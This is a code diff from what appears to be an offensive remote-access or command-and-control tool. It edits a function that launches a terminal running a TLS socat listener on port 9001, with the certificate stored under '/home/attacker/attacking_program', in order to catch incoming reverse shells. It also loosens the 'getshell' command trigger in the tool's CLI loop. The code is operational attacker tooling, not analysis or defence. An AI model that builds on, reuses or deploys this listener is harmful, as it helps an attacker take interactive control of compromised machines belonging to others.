@@ -571,13 +571,12 @@ def socket_listener():
 def run_socat_shell(port=9001):
     terminal_cmd = None
 
-    if shutil.which("gnome-terminal"):
+    if shutil.which("kitty"):
         terminal_cmd = [
-            "gnome-terminal",
-            "--",
-            "bash",
-            "-c",
-            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
+            "kitty",
+            "--hold",
+            "-e",
+            f"socat openssl-listen:{port},reuseaddr,cert=/home/attacker/attacking_program/server.pem,verify=0 file:`tty`,raw,echo=0"
         ]
     elif shutil.which("xterm"):
         terminal_cmd = [
@@ -626,7 +625,7 @@ def run_cli():
                     line = session.prompt().strip()
                     if not line:
                         continue
-                    if line.lower() == "getshell":
+                    if "getshell" in line.lower():
                         threading.Thread(target=run_socat_shell).start()
                         time.sleep(1)
                     command_history.append(line)
